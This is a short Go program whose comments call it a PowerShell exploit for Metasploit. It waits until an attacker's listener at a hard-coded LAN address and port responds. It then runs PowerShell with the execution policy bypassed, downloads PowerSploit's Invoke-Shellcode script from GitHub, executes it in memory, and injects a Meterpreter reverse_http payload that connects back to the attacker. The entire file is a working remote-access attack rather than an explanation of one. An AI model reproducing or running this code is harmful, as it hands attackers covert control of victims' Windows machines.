// Powershell exploit reverse http metasploit
// It will connect with a meterpreter session running on LHOST:LPORT granting superpowers ;)

package main

import (
	"fmt"
	"net/http"
	"os/exec"
	"time"
)

const (
	LHOST = "192.168.1.19"
	LPORT = 3000
)

var (
	url = "https://raw.githubusercontent.com/enigma0x3/PowerSploit/446d621c8c2e9fa9e92168aa46c3de8266ffac30/CodeExecution/Invoke--Shellcode.ps1"
	cmd = fmt.Sprintf(`IEX (New-Object Net.WebClient).DownloadString('%s')`, url)

	shell = fmt.Sprintf("Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost %s -lport %d -Force -Verbose", LHOST, LPORT)
)

// Exploit the target
func exploit() {
	for {
		if isReadyForConnection() {
			binary, _ := exec.LookPath("powershell")
			exec.Command(binary, fmt.Sprintf(`PowerShell -ExecutionPolicy Bypass -NoLogo -NoExit -Command "%s;%s"`, cmd, shell)).Run()

			break
		}

		// One try per second
		time.Sleep(time.Second)
	}
}

// Check if the remote host is ready for connection
func isReadyForConnection() bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", fmt.Sprintf("http://%s:%d", LHOST, LPORT), nil)
	req.Header.Set("User-Agent", "Meterpreter_Reverse_Http_Bot/1.0")
	resp, err := client.Do(req)
	if resp != nil && err == nil {
		if resp.StatusCode == 200 {
			return true
		}
	}

	return false
}
